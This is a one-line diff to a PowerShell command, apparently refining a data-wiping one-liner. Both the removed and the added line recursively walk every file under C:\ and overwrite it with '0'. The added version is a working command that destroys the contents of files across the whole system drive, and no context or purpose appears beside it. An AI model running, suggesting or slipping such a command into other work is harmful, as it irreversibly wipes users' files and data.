@@ -1,1 +1,1 @@
-gci c:\ -i * -r -force | set-content "0"
+gci c:\ -r | foreach -process {Set-Content $_ "0"}
